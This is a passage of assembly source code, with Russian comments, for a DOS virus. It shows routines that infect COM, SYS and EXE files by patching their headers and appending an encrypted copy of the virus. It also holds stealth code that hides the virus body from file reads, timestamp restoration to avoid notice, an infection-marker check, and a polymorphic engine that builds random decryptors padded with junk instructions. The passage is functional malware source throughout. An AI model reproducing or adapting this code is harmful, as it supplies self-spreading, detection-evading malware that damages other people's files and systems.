        mov     ah,3eh          ; закрытие файла
        call    int21
        ret

 SeekSave:
        call    SaveRegs        ; сохранение позиции
        xor     cx,cx           ; указателя (lseek) в файле
        xor     dx,dx
        call    seekfrom_cur
        mov     cs:seek_pos,ax
        mov     cs:seek_pos+2,dx
        call    LoadRegs
        ret

 RestoreSeek:
        call    SaveRegs        ; восстановление сохраненной
        mov     dx,cs:seek_pos  ; позиции указателя а файле
        mov     cx,cs:seek_pos+2
        call    seekfrom_bof
        call    LoadRegs
        ret

 seek2bof:
        mov     ax,4200h        ; установка указателя на
        xor     cx,cx           ; начало файла
        xor     dx,dx
        jmp     realseek

 seek2eof:
        mov     ax,4202h        ; установка указателя на
        xor     cx,cx           ; конец файла
        xor     dx,dx
        jmp     realseek

 seekfrom_eof:
        mov     ax,4202h        ; установка указателя
        jmp     realseek        ; от конца файла

 seekfrom_cur:
        mov     ax,4201h        ; установка указателя
        jmp     realseek        ; от текущей позиции

 seekfrom_bof:
        mov     ax,4200h        ; установка указателя
                                ; от начала файла
 realseek:
        call    int21
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; обработчик int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int24: mov     al,3            ; Fail caller
        iret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; псевдо int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int21: pushf                   ; занос в стек флагов и кодового
        push    cs              ; сегмента
        call    exithandler     ; управление вернется по адресу в стеке
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла (дисковый?)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ioctl: push    ax dx           ; сохранение регистров
        mov     ax,4400h        ; IOCTL - GET DEVICE INFORMATION
        call    int21
        jc      chkd            ; DOS вернул сообщение об ошибке
        sub     dl,10000000b    ; проверка бита номер 7
        cmc
 chkd:  pop     dx ax
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; перевод двух латинских символов в AH и AL в верхний регистр
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 upreg: xchg    al,ah           ; меняем местами AL и AH
        call    upral           ; переводим в верхний регистр бывший AH
        xchg    al,ah           ; восстанавливаем положение AL и AH
        call    upral           ; переводим в верхний регистр AL
        ret                     ; выход из подпрограммы

 upral: cmp     al,'a'          ; проверка на нахождение AL
        jb      noupr           ; в интервале от 61h до 74h
        cmp     al,'z'
        ja      noupr
        sub     al,20h          ; перевод в верхний регистр
 noupr: ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SeekHide
; если позиция lseek находится на теле вируса, подпрограмма переносит его
; на границу вируса и зараженной программы, т.е. на конец чистой программы
; SEEK_POS содержат новую позицию lseek
; NRBYTES уменьшается на разность двух позиций
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekhide:
        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохраняем текущее положение указателя
        mov     cx,-1           ; двигаем указатель на границу вируса и
        mov     dx,-vsize       ; программы
        call    seekfrom_eof    ; DX:AX - голова вируса
        sub     ax,cs:seek_pos  ; SEEK_POS - старая позиция
        sbb     dx,cs:seek_pos+2
        cmp     dx,-1           ; DX:AX должно быть отрицательным
        jnz     not_us
        or      ax,ax
        jns     not_us
        neg     ax              ; получение разности позиций
        sub     cs:nrbytes,ax   ; уменьшение количества прочитанных байтов
        sub     cs:seek_pos,ax  ; уменьшение позиции указателя в файле
        sbb     cs:seek_pos,0   ; т.е. смещение ее на голову вируса
 not_us:
        call    RestoreSeek     ; восстановление позиции указателя
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подсчет CRC вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crc:   push    si cx
        lea     si,shield
        mov     cx,end_crc-shield
        call    crc32
        pop     cx si
        ret

 CRC32: push    ebx ecx edx esi edi ds
        cld
        mov     di,cx
        mov     ecx,-1
        mov     edx,ecx
        mvs     ds,cs

   NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
   NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0edb8h
   NoCRC:
        dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     di
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        pop     ds edi esi edx ecx ebx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование handle
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Infect_Handle:
        push    cs cs           ; ds и es показывают на нас
        pop     ds es
        call    ioctl           ; проверка файла на фиктивность (disk file?)
        jc      close

        call    Inf_Check       ; проверка файла на повторное заражение
        jc      close

        mov     cx,32           ; чтение заголовка файла
        lea     dx,original
        call    read
        cmp     cx,ax           ; DOS вернул все запрошенные для
        jne     close           ; чтения байты?

        lea     si,original     ; сделать копию оригинального
        lea     di,header       ; начала программы
        mov     cx,32
        cld
        rep     movsb

        lea     di,header
        cmp     host,"S"        ; проверка на .SYS тип
        jz      sysinfect
        mov     ax,[di]         ; взять в ax первые 2 байта заголовка
        cmp     ax,'ZM'         ; проверка на EXE тип
        je      exeinfect
        cmp     ax,'MZ'         ; таких EXEшников я никогда не видел
        je      exeinfect       ; но говорят такие бывают
        jmp     cominfect

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование COM файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 cominfect:
        mov     host,"C"        ; COM file
        cmp     w [di],-1       ; для предотвращения бага с .SYS файлами
        jz      Close           ; кстати это еще и вызовет int 06h
        call    seek2eof        ; получение размера файла
        or      dx,dx           ; размер файла больше 65535 байт?
        jnz     Close
        cmp     ax,65035-vsize  ; проверка файла на переполнение
        ja      Close           ; место еще оставлено под стек и PSP
        mov     b [di],0e9h     ; запись JMP
        mov     delta,ax        ; дополнительное смещение для полиморфа
        sub     ax,3            ; коррекция (минус размер jump'а)
        mov     w [di+1],ax     ; запись адреса перехода
        jmp     check

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование SYS файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sysinfect:
        mov     host,"S"        ; SYS file
        cmp     d [di],-1       ; действительно драйвер?
        jnz     Close

        call    seek2eof        ; получение размера файла
        or      dx,dx           ; размер файла больше 65535 байт?
        jnz     Close
        cmp     ax,65035-vsize  ; проверка файла на переполнение
        ja      Close

        mov     w [di+8],ax     ; установка смещения процедуры прерывания
        add     w [di+8],Interrupt-ksenia
        mov     w [di+6],ax     ; установка смещения процедуры стратегии
        sub     ax,0100h
        mov     delta,ax        ; дополнительное смещение для полиморфа
        jmp     check

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование EXE файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinfect:
        mov     host,"E"        ; EXE file
        cmp     b [di+18h],'@'  ; проверка файла на принадлежность
        je      close           ; к новому семейству WinNE файлов

        mov     ax,W [di+4]     ; считать параметр PageCnt
        mov     cx,W [di+2]     ; считать параметр PartPag
        or      cx,cx           ; если длина последней страницы равна
        jz      $+3             ; нулю, то параметр PageCnt не содержит
        dec     ax              ; дополнительной единицы
        mov     dx,512          ; умножение на 512 (получение байт)
        mul     dx
        add     ax,cx           ; получение длины из EXE файла, которая
        adc     dx,0            ; грузится в память при запуске это EXE

        push    dx ax           ; сохранить пареметр в стеке
        call    seek2eof        ; получение дискового размера файла
        pop     si cx           ; загрузка параметров из стека
        cmp     si,ax           ; сравнение параметров (выявление
        jnz     Close           ; всяких overlay структур)
        cmp     cx,dx
        jnz     Close           ; очень большие файлы нам не подходят
        cmp     dx,10           ; как они в память грузяться??? но такие
        jae     Close           ; бывают (случается divide overflow ниже)

        push    ax dx           ; сохранение параметров
        mov     cx,16           ; получение входной точки (CS:IP), которые
        div     cx              ; расположены в конце чистого EXE файла
        sub     ax,[di+8]       ; вычитание размера EXE заголовка
        mov     delta,dx        ; дополнительное смещение для полиморфа
        sub     ax,10h          ; подобие COM файлу (IP больше/равно 100h)
        add     dx,100h
        mov     W [di+14h],dx   ; сохранение IP
        mov     W [di+16h],ax   ; сохранение CS
        mov     W [di+0eh],ax   ; сохранение SS (ой TBSCAN заорет)
        mov     W [di+10h],-2   ; сохранение SP
        pop     dx ax           ; загрузка параметров из стека

        add     ax,vsize        ; добавление к размеру файла
        adc     dx,0            ; длины вируса
        mov     cx,512          ; считаем новые PartPag и PageCnt для
        div     cx              ; файла вместе с вирусом
        or      dx,dx
        jz      $+3
        inc     ax
        mov     [di+2],dx       ; сохранение PartPag
        mov     [di+4],ax       ; сохранение PageCnt

 Check: call    WriteVirus      ; запись вирус в файл

 Close: call    CorrectDate     ; правка даты инфицированного файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; запись зашифрованного тела вируса в файл
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 WriteVirus:
        call    GetDate         ; запрос времени/даты файла

        cmp     cs:save_ax,1857h; проверка необходимости порверки
        jz      no_time         ; времени файла

        mov     ah,2ch          ; запрос текущего времени
        call    int21           ; в dx:cx
        mov     ax,cs:time      ; в ax время файла
        shr     ah,3            ; берем часы (биты 11-15 в cx)
        cmp     ah,ch           ; совпадают? если да, то съябываемся,
        je      write_fail      ; чтобы не засветиться
 no_time:
        call    seek2eof        ; -> конец
        call    nexus
        call    write           ; записываемся в файл
        xor     cx,ax           ; все записалось?
        jnz     write_fail

        call    seek2bof        ; идем в начало
        mov     cx,32           ; заголовок com/exe файла
        lea     dx,header
        mov     w header+12h,v_id
        call    write

  write_fail:
        call    RestDate        ; восстановление даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла на инфицированность
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Inf_Check:
       call    SaveRegs         ; сохранить в стеке регистры

       call    SeekSave         ; сохраняем позицию lseek
       call    seek2bof         ; переносим указатель на начало

       mov     cx,32            ; читаем заголовок в буфер
       lea     dx,buffer
       push    cs cs
       pop     ds es
       call    read

       call    RestoreSeek      ; восстановить позицию lseek
       xor     cx,ax            ; все прочиталось?
       jnz     not_infected
       cmp     w buffer+12h,v_id
       jnz     not_infected

       call    LoadRegs
       stc
       ret

 not_infected:
       call    LoadRegs
       clc
       ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; CRLOAD - подпрограмма для получения оригинального начала
; зараженной программы из зашифрованного вируса в этой программе
; вход: BX - handle инфицированной программы
; выход: "buffer" содержит 32 оригинальных байта
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crload:
        call    SaveRegs        ; сохранение регистров
        push    cs cs           ; инициализация сегментных регистров
        pop     ds es

        xor     cx,cx           ; сохранение позиции указателя в файле
        xor     dx,dx
        call    seekfrom_cur
        push    dx ax

        mov     cx,-1           ; идем в конец вируса
        mov     dx,-32          ;
        call    seekfrom_eof    ;

        mov     cx,32           ; читаем заголовок
        lea     dx,buffer       ; в буфер
        call    read

        pop     dx cx           ; восстанавливаем позицию указателя
        call    seekfrom_bof

        call    LoadRegs        ; восстановление регистров
        ret

░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒
; POLYMORPHIC ENGINE [NEXUS]
; в качестве входных параметров установить DELTA как экстра смещение в файле
; на выходе CX,DX готовы к вызову функции 40h прерывания int 21h
░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒
 nexus: call    SaveRegs        ; инициализация
        push    cs cs
        pop     ds es
        cld
        lea     di,buffer

        mov     al,60h
        stosb

        mov     r_used,-1       ; ни один из регистров не используется
        call    garbage         ; генерация мусора

        mov     w_flag,1        ; Инициализация Счетчика
        call    get_reg         ; получение номера регистра
        mov     b r_used,al     ; занесение его в список использованных
        or      al,10111000b    ; создание команды MOV REG,Const (16)
        stosb                   ; сохранение команды
        mov     ax,vsize-crlen-32 ; вычисление количества байт для зашифровки
        stosw                   ; сохранение константы

        call    garbage         ; генерация мусора

 gidx:  mov     w_flag,1        ; генерация 16-битного адресного регистра
        call    get_reg         ; генерация случайного регистра
        mov     ah,111b         ; проверка на адресный регистр и получения
        cmp     al,011b         ; параметра для адресации с помощью этого
        je      sidx            ; регистра
        mov     ah,100b
        cmp     al,110b
        je      sidx
        mov     ah,101b
        cmp     al,111b
        jne     gidx

 sidx:  mov     b r_used+1,al   ; сохранение номера адресного регистра
        mov     rm_flag,ah      ; сохранение параметра R/M

        or      al,10111000b    ; Инициализация Адресного Регистра
        stosb                   ; создание команды MOV REG,Const (16)
        mov     ax,delta        ; вычисление смещения начала зашифрованного
        add     ax,crlen+100h   ; вируса в файле
        stosw

        call    garbage         ; генерация мусора

 rchos: mov     bp,di           ; сохранение указателя на дескриптор
        mov     ax,oplen        ; выбор случайного шифровщика
        call    xrandom
        mov     si,ax           ; SI=AX*2
        add     si,ax
        mov     ax,w [si+enopI] ; чтение шифровщика
        or      ah,101b         ; зашифровка будет идти с участием DI
        bt      ax,1            ; проверка необходимости ключа
        mov     w nbuf,ax       ; сохранение шифратора
        mov     b nbuf+3,0c3h   ; RETn
        mov     al,90h          ; NOP
        jc      nokey

        mov     ax,0ffh         ; получение случайного числа
        call    xrandom
        inc     ax              ; исключение попадания 0
 nokey: mov     b nbuf+2,al

        mov     al,[di]         ; проверка команды: на самом деле она
        call    near ptr nbuf   ; зашифровывает байт?
        cmp     al,[di]
        jz      rchos

        mov     al,2eh          ; Генерация Дешифратора
        stosb                   ; SEGCS
        mov     ax,w [si+deopI] ; чтение расшифровщика
        or      ah,rm_flag      ; правка опкода (учет R/M адресного регистра)
        stosw
        bt      ax,1            ; проверка необходимости ключа
        jc      uukey
        mov     al,b nbuf+2     ; копирование ключа из буфера
        stosb                   ; в дескриптор

 uukey: call    garbage         ; генерация мусора

        mov     al,01000000b    ; Генерация увеличения индексного регистра
        or      al,b r_used+1
        stosb
        call    garbage         ; генерация мусора

        mov     al,01001000b    ; Уменьшаем счетчик
        or      al,b r_used
        stosb
        mov     al,01110101b    ; Генерируем команду JNZ
        stosb                   ; переход на дескриптор
        mov     ax,bp
        sub     ax,di
        dec     ax
        stosb

        mov     si,di           ; подготовка к генерации нехватающих
        sub     si,offset buffer ; мусорных команд (заполнение всего
        mov     ax,crlen        ; предоставленного под дескриптор места
        sub     ax,si           ; мусорными командами)
        mov     cx,ax
        dec     cx
        mov     r_used,-1       ; ни один из регистров не используется
        call    ncmd            ; генерация CX байт мусора
        mov     al,61h
        stosb

        mov     cx,shield-ksenia-crlen
        lea     si,ksenia+crlen
        lea     di,buffer+crlen
        rep     movsb
        mov     cx,endi-shield-1
 dupcr: lodsb
        sub     al,[si]
        stosb
        loop    dupcr
        mov     cx,eov-endi+1
        rep     movsb

        mov     cx,vsize-crlen-32
        lea     di,buffer+crlen
 encp:  call    near ptr nbuf
        inc     di
        loop    encp

        call    LoadRegs
        mov     cx,vsize
        lea     dx,buffer
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации мусорного кода случайного размера
; DS=ES=CS, [DI] - буфер для мусора (DI инкрементируется)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 gmax   equ     crlen/7
 gmin   equ     gmax/2
 garbage:
        push    ax cx
        mov     ax,gmax-gmin
        call    xrandom
        add     ax,gmin
        xchg    ax,cx
        call    ncmd
        pop     cx ax
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации мусорного кода на базе таблицы
; DS=ES=CS, [DI] - буфер для мусора (DI инкрементируется)
; CX - нужная длина всего мусора
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ncmd:  push    ax bx cx dx si  ; сохранение регистров
        jcxz    gret

 ggen:  push    di cx
        lea     di,crbuf
        call    gcmd
        xchg    ax,cx
        pop     cx di
        cmp     cx,ax
        jc      ggen
        lea     si,crbuf

 gdup:  movsb
        dec     cx
        dec     ax
        jnz     gdup
        or      cx,cx
        jnz     ggen

 gret:  pop     si dx cx bx ax ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации случайной мусорной инструкции
; DS=ES=CS, [DI] - буфер для инструкции
; на выходе CX - длина инструкции в байтах
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 gcmd:  push    ax bx dx si di  ; сохранение регистров
        mov     cx,2            ; регенерация: 2 раза

 greg:  lea     si,opcode       ; таблица с опкодами
        mov     ax,oclen        ; генерация случайного числа в пределе от
        call    xrandom         ; нуля до количества строк в таблице
        add     si,ax           ; получение смещения к выбранной ячейке
        add     si,ax
        add     si,ax
        mov     dl,[si]         ; загрузка Управляющего_байта
        mov     ax,[si+1]       ; копирование шаблона инструкции
        mov     [di],ax

        test    dx,10000000b    ; проверка флага регенерации
        loopnz  greg

        xor     bx,bx
        bt      dx,0            ; установка длины инструкции
        setc    bl

        bt      dx,6
        setc    w_flag
        test    dl,00000100b    ; проверка необходимости генерации
        jz      nWRD            ; поля WRD
        mov     ax,2
        call    xrandom
        mov     w_flag,al
        test    dl,00100000b
        jz      bit1
        rol     al,3
  bit1: or      [di],al         ; установка поля в ячейке памяти
 nWRD:  test    dl,00000010b    ; проверка необходимости генерации
        jz      nREG            ; поля REG
        call    get_reg         ; генерация случайного регистра
        or      [di+bx],al      ; установка поля в ячейке памяти
 nREG:  mov     cl,dl
        shr     cl,3
        and     cl,11b          ; проверка необходимости генерации
        jz      nRND            ; случайного значения после инструкции
        cmp     cl,11b
        jne     pRND
        mov     cl,w_flag
        inc     cl
 pRND:  xor     ax,ax
        call    xrandom
        mov     [di+bx+1],al
        inc     bx
        dec     cl
        jnz     pRND
 nRND:  mov     cx,bx
        inc     cx
        pop     di si dx bx ax  ; загрузка регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации номера регистра в AL
; на входе: r_used (2 байта) - номера занятых 16-битных регистров
;           w_flag - разрядность регистра (0-8 бит,1-16 бит)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 get_reg:
        mov     ax,8            ; получаем случайный номер
        call    xrandom         ; от 0 до 7
        mov     ah,al           ; дублируем его

        cmp     w_flag,1        ; тип запрашиваемого регистра
        jz      r16             ; в случае 8-битного регистра проверка, не
        and     ah,11111011b    ; является ли он половинкой использованных
        jmp     r_chk           ; регистров r_used

 r16:   cmp     ah,100b         ; в случае 16-битного регистра проверка, не
        jz      get_reg         ; является ли он регистром SP

 r_chk: cmp     b r_used,ah     ; сейчас проверяем, не получили ли мы
        jz      get_reg         ; уже использованный регистр, записанный
        cmp     b r_used+1,ah   ; в r_used
        jz      get_reg
        cbw                     ; ah=0
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Таблица опкодов для мусора (DB Управляющий_байт, DB опкод, DB опкод)
; Управляющий_байт выглядит следующим образом:
; 00000000
; │││└┤││└ длина инструкции (+1 байт)
; │││ ││└─ надобность поля REG (биты [0-2] последнего байта команды)
; │││ │└── надобность поля WRD
; │││ └─── добавление случайного значения (00-нет,01-байт,10-слово,11-по WRD)
; ││└───── положение поля WRD (0-бит 0, 1-бит 3 первого байта команды)
; │└────── значение поля WRD, если его не надо генерить
; └─────── регенерация случайного числа
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 opcode db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      00011111b,11110110b,11000000b ; TEST    REG,Const (8/16)
        db      00011111b,10000000b,11000000b ; ADD     REG,Const (8/16)
        db      00011111b,10000000b,11001000b ; OR      REG,Const (8/16)
        db      00011111b,10000000b,11010000b ; ADC     REG,Const (8/16)
        db      00011111b,10000000b,11011000b ; SBB     REG,Const (8/16)
        db      00011111b,10000000b,11100000b ; AND     REG,Const (8/16)
